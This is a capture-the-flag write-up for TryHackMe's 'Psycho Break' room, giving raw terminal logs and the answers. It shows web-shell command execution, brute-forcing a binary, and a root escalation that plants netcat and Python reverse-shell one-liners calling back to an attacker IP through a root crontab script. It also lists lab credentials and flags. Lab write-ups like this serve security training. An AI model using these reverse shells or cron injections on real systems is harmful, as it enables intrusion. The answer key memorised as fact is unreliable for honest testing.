# Psycho Break

Help Sebastian and his team of investigators to withstand the dangers that come ahead.

[Psycho Break](https://tryhackme.com/room/psychobreak)

## Topic's

- Network Enumeration
- Web Poking
- Cryptography
  - Vigenère
  - Morse Code (Audio)
- OSINT
- Web Enumeration
- Directory Traversal
- Reverse Engineering
- Steganography
- Brute Forcing (Binary)
- Exploitation Crontab

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

```html
<!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->

<!-- To find more about Sadist visit https://theevilwithin.fandom.com/wiki/Sadist -->

<p>
  Decode this piece of text "Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv" and get the key
  to access the map
</p>
<p>
  https://www.boxentriq.com/code-breaking/cipher-identifier
  Grant_me_access_to_the_map_please http://10.10.172.137/map.php

  <!-- I think I'm having a terrible nightmare. Search through me and find it ... -->

  kali@kali:~/CTFs/tryhackme/Psycho Break$ gobuster dir -u
  http://10.10.172.137/SafeHeaven/ -w
  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  =============================================================== Gobuster
  v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  =============================================================== [+] Url:
  http://10.10.172.137/SafeHeaven/ [+] Threads: 10 [+] Wordlist:
  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes:
  200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s
  =============================================================== 2020/11/15
  15:37:53 Starting gobuster
  =============================================================== /imgs (Status:
  301) /keeper (Status: 301)
  =============================================================== 2020/11/15
  15:50:37 Finished
  ===============================================================

  <!-- To find more about the Keeper visit https://theevilwithin.fandom.com/wiki/The_Keeper -->

  st. augustine lighthouse You Got The Keeper Key !!! Here is your key :
  48ee41458eb0b43bf82b986cecf3af01

  <!-- There is something called "shell" on current page maybe that'll help you to get out of here !!!-->

  <!-- To find more about the Spider Lady visit https://theevilwithin.fandom.com/wiki/Laura_(Creature) -->

  http://10.10.172.137/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls
  http://10.10.172.137/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls%20..
  680e89809965ec41e64dc7e447f175ab be8bc662d1e36575a52da40beba38275 index.php
  http://10.10.172.137/abandonedRoom/680e89809965ec41e64dc7e447f175ab/
  kali@kali:~/CTFs/tryhackme/Psycho Break$ cat you_made_it.txt You made it.
  Escaping from Laura is not easy, good job ....
  kali@kali:~/CTFs/tryhackme/Psycho Break$ unzip helpme.zip Archive: helpme.zip
  inflating: helpme.txt inflating: Table.jpg kali@kali:~/CTFs/tryhackme/Psycho
  Break$ cat helpme.txt From Joseph, Who ever sees this message "HELP Me". Ruvik
  locked me up in this cell. Get the key on the table and unlock this cell. I'll
  tell you what happened when I am out of this cell. SHOWME
  kali@kali:~/CTFs/tryhackme/Psycho Break$ cat thankyou.txt From joseph, Thank
  you so much for freeing me out of this cell. Ruvik is nor good, he told me
  that his going to kill sebastian and next would be me. You got to help
  Sebastian ... I think you might find Sebastian at the Victoriano Estate. This
  note I managed to grab from Ruvik might help you get inn to the Victoriano
  Estate. But for some reason there is my name listed on the note which I don't
  have a clue. -------------------------------------------- // \\ || (NOTE) FTP
  Details || || ================== || || || || USER : joseph || || PASSWORD :
  intotheterror445 || || || \\ // --------------------------------------------
  Good luck, Be carefull !!! kali@kali:~/CTFs/tryhackme/Psycho Break$ chmod +x
  program kali@kali:~/CTFs/tryhackme/Psycho Break$ strings random.dic >
  brute.txt kali@kali:~/CTFs/tryhackme/Psycho Break$ while read LINE; do
  ./program "$LINE"; done < brute.txt | grep Correct kidman => Correct
  kali@kali:~/CTFs/tryhackme/Psycho Break$ ./program kidman kidman => Correct
  Well Done !!! Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3
  444 7777 7777 666 7777 8 777 2 66 4 33 https://keypad-translator.glitch.me/ k
  i d m a n s p a s s w o r d i s s o s t r a n g e KIDMANSPASSWORDISSOSTRANGE
  kidman kidman@evilwithin:~$ cat user.txt 4C72A4EF8E6FED69C72B4D58431C4254
  kidman@evilwithin:~$ cat /etc/crontab # /etc/crontab: system-wide crontab #
  Unlike any other crontab you don't have to run the `crontab' # command to
  install the new version when you edit this file # and files in /etc/cron.d.
  These files also have username fields, # that none of the other crontabs do.
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom
  mon dow user command 17 * * * * root cd / && run-parts --report
  /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / &&
  run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron
  || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x
  /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) */2 * *
  * * root python3 /var/.the_eye_of_ruvik.py rm /tmp/f;mkfifo /tmp/f;cat
  /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f import
  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9001));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
  kali@kali:~/CTFs/tryhackme/Psycho Break$ nc -lnvp 9001 Listening on 0.0.0.0
  9001 Connection received on 10.10.172.137 57536 bash: cannot set terminal
  process group (1763): Inappropriate ioctl for device bash: no job control in
  this shell root@evilwithin:~# cat /root/root.txt cat /root/root.txt
  BA33BDF5B8A3BFC431322F7D13F3361E root@evilwithin:~#
</p>
```

## Task 1 Recon

This room is based on a video game called evil within. I am a huge fan of this game. So I decided to make a CTF on it. With my storyline :). Your job is to help Sebastian and his team of investigators to withstand the dangers that come ahead.

[Hints are provided as you progress through the challenge]

The VM might take up to 2-3 minutes to fully boot up.

Deploy the machine.

`No answer needed`

```
kali@kali:~/CTFs/tryhackme/Psycho Break$ sudo nmap -p- -sS -sC -sV -O 10.10.172.137
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-15 15:24 CET
Nmap scan report for 10.10.172.137
Host is up (0.033s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 44:2f:fb:3b:f3:95:c3:c6:df:31:d6:e0:9e:99:92:42 (RSA)
|   256 92:24:36:91:7a:db:62:d2:b9:bb:43:eb:58:9b:50:14 (ECDSA)
|_  256 34:04:df:13:54:21:8d:37:7f:f8:0a:65:93:47:75:d0 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Becon Mental Hospital
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/15%OT=21%CT=1%CU=40600%PV=Y%DS=2%DC=I%G=Y%TM=5FB13A
OS:5F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.91 seconds
```

How many ports are open?

`3`

What is the operating system that runs on the target machine?

`Ubuntu`

## Task 2 Web

Here comes the web.

Key to the looker room

![](./2020-11-15_15-29.png)

`532219a04ab7a02b56faafbec1a4c1ea`

Key to access the map

`Grant_me_access_to_the_map_please`

The Keeper Key

`48ee41458eb0b43bf82b986cecf3af01`

What is the filename of the text file (without the file extension)

`you_made_it`

## Task 3 Help Mee

Get that poor soul out of the cell.

Who is locked up in the cell?

`Joseph`

There is something weird with the .wav file. What does it say?

`SHOWME`

What is the FTP Username

`joseph`

What is the FTP User Password

`intotheterror445`

## Task 4 Crack it open

Brute Brute Brute.

The key used by the program

`kidman`

What do the crazy long numbers mean when there decrypted.

`KIDMANSPASSWORDISSOSTRANGE`

## Task 5 Go Capture The Flag

> > Root Me <<

user.txt

`4C72A4EF8E6FED69C72B4D58431C4254`

root.txt

`BA33BDF5B8A3BFC431322F7D13F3361E`

[Bonus] Defeat Ruvik

`No answer needed`

## Task 6 Copyright material

The images used in this CTF are obtained from:

1. The Fandom wiki under CC-BY-SA license.
2. User Wordridden at flickr.com under cc by 2.0 license.
   Congratulations you've complete the evil-within. This is the first room I've ever created so If you enjoyed it please give me a follow up on twitter (https://twitter.com/ShalindaFdo) and send me your feedback :).

`No answer needed`
